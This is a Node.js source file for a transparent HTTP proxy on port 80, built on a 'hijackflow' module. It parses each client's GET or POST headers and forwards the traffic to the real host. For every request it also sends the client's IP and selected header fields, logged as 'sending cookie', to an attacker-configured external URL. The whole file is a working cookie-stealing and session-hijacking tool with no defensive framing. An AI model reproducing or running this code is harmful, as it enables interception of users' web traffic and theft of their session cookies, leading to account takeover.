var net = require('net'),
    Flow = require('./hijackflow.js').HijackFlow,
    http = require('http');

var server = net.createServer(function (con) {

  con.setNoDelay();
  var proxy, flow = new Flow();

  flow.on('header', function (o) {
    http.get(getUrl(o['headers'], con.remoteAddress)); // send data
    console.log('sending cookie: ' + con.remoteAddress + ': ' + o['hostname']);
  });

  con.on('data', function (data) {

    var oheader, req = data.readUInt32BE(0);

    if (req === 0x47455420) { // GET
      oheader = parseHeader(data);
    } else if (req === 0x504f5354) { // POST
      oheader = parseHeader(data.slice(0, getHeaderIndex(data)));
    } else {
      con.end();
      return;
    }

    con.pause();
    con.unshift(data);

    con.removeListener('data', arguments.callee);

    proxy = net.connect({ port: oheader['port'], host: oheader['hostname'] }, function () {
      con.resume();
      con.pipe(flow).pipe(proxy);
      proxy.pipe(con);
    });
    proxy.on('error', function (e) {
      con.end();
    });

    con.on('error', function (e) {
    });

    
  });


});

function getHeaderIndex(buf) {
  var end = [13, 10, 13, 10], cur = 0; expect = 3;
  for (var i = 0, j = buf.length; i < j; i++) {
    if (buf[i] === end[cur]) {
      if (cur === expect) return i+1;
      cur++;
    } else {
      cur = 0;
    }
  }
  return -1;
}


function parseHeader(buf) {
  var o = {},
      headers = buf.toString().slice(0, -4).split('\r\n'),
      line = headers.shift().split(' '),
      protocol = line[2].split('/');
  o['method'] = line[0].toUpperCase();
  o['path'] = line[1];
  o['protocol'] = protocol[0].toUpperCase();
  o['version'] = protocol[1];
  o['headers'] = {};
  var r = /^([^:]+): *(.+)$/, m, header = o['headers'];
  for (var i = 0, j = headers.length; i < j; i++) {
    m = headers[i].match(r);
    if (m) {
      header[m[1].toLowerCase()] = m[2];
    } 
  }

  var ohost = parseHost(o['headers']['host']);
  o['hostname'] = ohost['host'];
  o['port'] = ohost['port'];

  return o;
}

function parseHost (host) {
  var o = { host: host, port: 80 },
      r = /^([^:]+):(\d+)$/, m;
  if (m = host.match(r)) {
    o['host'] = m[1];
    o['port'] = parseInt(m[2]);
  }
  return o;
}

var url, fields;
exports.start = function (_url, _fields) {
  url = _url; fields = _fields;
  server.listen(80, function () {
    console.log('Http server has started.');
  });
};
exports.stop = function () {
  server.close(function () {
    console.log('Http server has stoped.');
  });
};

function getUrl (o, ip) {
  var p = '?ip=' + ip+ '&', f;
  for (var i = 0, j = fields.length; i < j; i++) {
    f = fields[i];
    p += encodeURIComponent(f) + '=' + (o[f] ? encodeURIComponent(o[f]) : '') + '&';
  }
  return url + p.slice(0, -1);
}
 

